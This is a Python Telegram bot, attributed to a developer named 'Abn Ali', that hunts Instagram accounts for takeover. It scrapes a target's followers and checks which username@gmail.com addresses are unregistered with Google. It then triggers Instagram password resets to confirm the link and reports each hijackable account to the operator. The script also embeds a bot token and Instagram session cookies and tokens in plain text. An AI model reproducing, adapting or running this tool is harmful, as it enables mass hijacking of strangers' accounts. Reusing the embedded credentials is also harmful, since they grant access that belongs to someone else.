#Source Abn Ali
#Developer rights (ABN Ali )
#Channel (https://t.me/Z_L_N )
import telebot
import requests
from requests import *
from uuid import uuid4
from random import *
from os import system
from time import sleep
from user_agent import generate_user_agent
from names import *
import requests
import json,redis
from telebot import types
from telebot.types import InlineKeyboardMarkup as mark
from telebot.types import InlineKeyboardButton as btn
bot = telebot.TeleBot("6242422194:AAEZbujpaGPcf8IeSVYd8W6lUxggooJFFas",num_threads=20)
r = redis.Redis(host="localhost",port=6379)
@bot.message_handler(commands=['start'])
def start(message):
    key = mark()
    key.row_width = 2
    btn1 = btn(text="- تعيين سيشن .",callback_data="setses")
    btn2 = btn(text="- بدو الصيد",callback_data="start")
    btn3 = btn(text="- سحب يوزرات .",callback_data="swap")
    btn5 = btn(text="- تنظيف ليست يوزرات .",callback_data="clean")
    btn4 = btn(text="- Dev .",url="https://t.me/N_P_X")
    key.add(btn1,btn2)
    key.add(btn3)
    key.add(btn4)
    bot.reply_to(message,f"- اهلا بك عزيزي .",reply_markup=key)
@bot.callback_query_handler(func=lambda m:True)
def qu(call):
    if call.data == "clean":
        open('list.txt', 'w').close()
        bot.send_message(call.message.chat.id,f"- تم التنظيف .")
    if call.data == "setses":
        mm = bot.send_message(call.message.chat.id,"- قم بأرسال السيشن الان ؟")
        bot.register_next_step_handler(mm,ses)
    if call.data == f"start":
        check(call.message)
    if call.data == "swap":
        mm = bot.send_message(call.message.chat.id,"- قم بأرسال يوزر لسحب منه الان ؟")
        bot.register_next_step_handler(mm,swap)
def swap(message):
    user=str(message.text)
    if r.exists(f"ses-{message.from_user.id}")==0:
        bot.reply_to(message,f"- قم بتعيين سيشن .")
    else:
        sis = r.get(f"ses-{message.from_user.id}").decode("utf-8")
        V = 0
        hea= {'accept':'*/*',
'accept-encoding':'gzip, deflate, br',
'accept-language':'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
'cookie':f'mid=YvPaYAABAAG3pnL6OA7VEBlLVuDo; ig_did=47F0CEA6-3B69-4576-A88E-23F3CE15444E; ig_nrcb=1; datr=H9vzYq35j3WCu3W5Jw-BuqMb; dpr=1.75; shbid="2195,10851247180,1692646123:01f7f8918df9fa999fdb6a750fc9a05b8d62f092d1be0d0d23e936e8ff8e45ee9b251c1c"; shbts="1661110123,10851247180,1692646123:01f71c2e913918d6e1dcf270151c6aa61fcd6126fe257c741383603452a7a0c34c6bc57b"; csrftoken=zVBIdDnql70N1snMvvgyYSURzx3krEk6; ds_user_id=1620578997; sessionid={sis}; rur="ASH,1620578997,1692893959:01f712aae2d0b57de05f19af02b46ed4749bb41507cf40f98020dffe52566210e796d3ef"',
'origin':'https://www.instagram.com',
'referer':'https://www.instagram.com/',
'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"',
'sec-ch-ua-mobile':'?1',
'sec-ch-ua-platform':'"Android"',
'sec-fetch-dest':'empty',
'sec-fetch-mode':'cors',
'sec-fetch-site':'same-site',
'user-agent':'Mozilla/5.0 (Linux; Android 11; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
'viewport-width':'412',
'x-asbd-id':'198387',
'x-csrftoken':'zVBIdDnql70N1snMvvgyYSURzx3krEk6',
'x-ig-app-id':'1217981644879628',
'x-ig-www-claim':'hmac.AR16wNjyuckc0qk4ogcBIWjOuYHm4V6EFi8U2XCJriHI4KjZ'}
        data = {'count': '12121212',
		'search_surface': 'follow_list_page'}
        hd = {'accept':'*/*',
'accept-encoding':'gzip, deflate, br',
'accept-language':'ar,en;q=0.9',
'origin':'https://www.instagram.com',
'referer':'https://www.instagram.com/',
'sec-ch-ua':'"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
'sec-ch-ua-mobile':'?0',
'sec-ch-ua-platform':'"Windows"',
'sec-fetch-dest':'empty',
'sec-fetch-mode':'cors',
'sec-fetch-site':'same-site',
'user-agent': generate_user_agent(),
'x-csrftoken':'8uoEYgxjJwHho1KYWE6s2LwIYf6CSgKb',
'x-ig-app-id':'936619743392459',
'x-ig-www-claim':'hmac.AR1cjP7xqazJ469Nhp3UMEg014y0pAUnf-plXYyvO3tupGkS'}
        rer = get(f"https://i.instagram.com/api/v1/users/web_profile_info/?username={message.text}",headers=hd).json()
        ID = rer['data']['user']['id']
        al = get(f"https://i.instagram.com/api/v1/friendships/{ID}/followers/",headers=hea,data=data).json()
        alf=al['users']
        print(alf)
        d = 0
        for i in range(100):
            try:
                d+=1
                folo = alf[i]['username']
                with open("list.txt","a")as a:
                    a.write(f"{folo}\n")
            except:
                continue
        a.close()
        bot.reply_to(message,f"تم سحب  : {d}")
def ses(message):
    r.set(F"ses-{message.from_user.id}",f"{message.text}")
    bot.reply_to(message,f"- تم تعيين : {message.text}")
def check(message):
    done = 0
    fail = 0
    file1 = open('list.txt', 'r+')
    Lines = file1.readlines()
    for user in Lines:
        
        email = user.strip()+"@gmail.com"
        print(email)

        url = 'https://android.clients.google.com/setup/checkavail'
        headers = {
		'Content-Length':'98',
		'Content-Type':'text/plain; charset=UTF-8',
		'Host':'android.clients.google.com',
		'Connection':'Keep-Alive',
		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
	}
        data = json.dumps({
		'username':str(email),
		'version':'3',
		'firstName':'trakos',
		'lastName':'diaa'
	})
        check = post(url,data=data,headers=headers)
        if check.json()['status'] == 'SUCCESS':
            url = "https://i.instagram.com/api/v1/accounts/send_password_reset/"
            headers = {
    "Content-Length": "317",
    "Content-Type": "application/x-www-form-urlencoded; charset\u003dUTF-8",
    "Host": "i.instagram.com",
    "Connection": "Keep-Alive",
    "User-Agent": "Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)",
    "Cookie2": "$Version\u003d1",
    "Accept-Language": "ar-EG, en-US",
    "X-IG-Connection-Type": "MOBILE(LTE)",
    "X-IG-Capabilities": "AQ\u003d\u003d",
    "Accept-Encoding": "gzip"}
            data = {
"user_email":str(email),
"device_id":uuid4(),
"guid":uuid4()}
            rew = post(url,headers=headers,data=data)
        
            if 'obfuscated_email' in rew.text:
                print(rew.text)
                rest=rew.json()['obfuscated_email']
                done = +1
                hd = {
'user-agent':'Mozilla/5.0 (Linux; Android 11; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
'viewport-width':'412',
'x-asbd-id':'198387',
'x-ig-app-id':'1217981644879628',
'x-ig-www-claim':'hmac.AR1GMxGxYNiyJ_Qr59WPgznfqJKtnAogUcpBr_5hDMSoxwjz'}
                rer = get(f"https://i.instagram.com/api/v1/users/web_profile_info/?username={user}",headers=hd).json()
                name = rer['data']['user']['full_name']
                follow = rer['data']['user']['edge_followed_by']['count']
                bio = rer['data']['user']['biography']
                id = rer['data']['user']['id']
                date = get(f"https://o7aa.pythonanywhere.com/?id={id}").json()['data']
                bot.send_message(message.chat.id,f"صيد جديد\n- اليوزر : {user}\n- الايميل : {email}\n- المتابعين : {follow}\n- البايو : {bio}\n- تاريح الانشاء : {date}\n- الايدي : {id}")
            else:
                sleep(1)
                fail +=1
                mees = types.InlineKeyboardMarkup(row_width=2)
                trakos = types.InlineKeyboardButton(f"- غير متاح : {fail}",callback_data='jhi')
                buut5 = types.InlineKeyboardButton(f"- يتم قحص   : {email}",callback_data='jhi5')
                buut1 = types.InlineKeyboardButton(f"- تم صيد : {done}",callback_data='jhi1')
                mees.add(buut5)
                mees.add(buut1,trakos)
            
                bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="**تم البدء ✅**",parse_mode='markdown',reply_markup=mees) 
        else:
        
            sleep(1)
            fail+=1
            mees = types.InlineKeyboardMarkup(row_width=2)
            trakos = types.InlineKeyboardButton(f"- غير متاح : {fail}",callback_data='jhi')
            buut5 = types.InlineKeyboardButton(f"- يتم قحص   : {email}",callback_data='jhi5')
            buut1 = types.InlineKeyboardButton(f"- تم صيد : {done}",callback_data='jhi1')
            mees.add(buut5)
            mees.add(buut1,trakos)
            bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="**تم البدء ✅**",parse_mode='markdown',reply_markup=mees) 
    bot.send_message(message.chat.id,f"تم انتهاء الفحص .")
def generate(message):
    hd = {
'accept':'*/*',
'accept-encoding':'gzip, deflate, br',
'accept-language':'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
'cookie':'mid=YvPaYAABAAG3pnL6OA7VEBlLVuDo; ig_did=47F0CEA6-3B69-4576-A88E-23F3CE15444E; ig_nrcb=1; datr=H9vzYq35j3WCu3W5Jw-BuqMb; dpr=1.75; shbid="2195,10851247180,1692646123:01f7f8918df9fa999fdb6a750fc9a05b8d62f092d1be0d0d23e936e8ff8e45ee9b251c1c"; shbts="1661110123,10851247180,1692646123:01f71c2e913918d6e1dcf270151c6aa61fcd6126fe257c741383603452a7a0c34c6bc57b"; csrftoken=zVBIdDnql70N1snMvvgyYSURzx3krEk6; ds_user_id=1620578997; sessionid=1620578997%3ApWPmmL6tEoOZDA%3A7%3AAYdPvGM-V5wKu0-DoZUPgGIzIbSOD3fHHbm-4zE44A; rur="ASH,1620578997,1692900959:01f7fccd4d888b3132aa698f9c34ecd94c31775a4982ae01d1feff1c92dc867ec9cf3556"',
'origin':'https://www.instagram.com',
'referer':'https://www.instagram.com/',
'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"',
'sec-ch-ua-mobile':'?0',
'sec-ch-ua-platform':'"Linux"',
'sec-fetch-dest':'empty',
'sec-fetch-mode':'cors',
'sec-fetch-site':'same-site',
'user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36',
'viewport-width':'980',
'x-asbd-id':'198387',
'x-csrftoken':'zVBIdDnql70N1snMvvgyYSURzx3krEk6',
'x-ig-app-id':'936619743392459',
'x-ig-www-claim':'hmac.AR1GMxGxYNiyJ_Qr59WPgznfqJKtnAogUcpBr_5hDMSox6Xf',}
    u = str(randint(1,7))
    s = str(''.join(choice('1234567890') for i in range(int(u))))
    e = str(choice([get_first_name(),get_full_name().replace(' ',''),get_last_name()]))
    rr = str(''.join(choice('asdfghjklmnbvcxzpoiuytrewq12334567890')))
    r = str(choice([e,rr]))
    req = get(f"https://i.instagram.com/api/v1/web/search/topsearch/?context=blended&query={r}&rank_token=0.6481600571666157&include_reel=true",headers=hd).json()['users']
    for i in req:
        email = f"{i['user']['username']}@gmail.com"
        print(i['user']['username'])
        user = f"{i['user']['username']}"
    generate(message)
bot.infinity_polling()
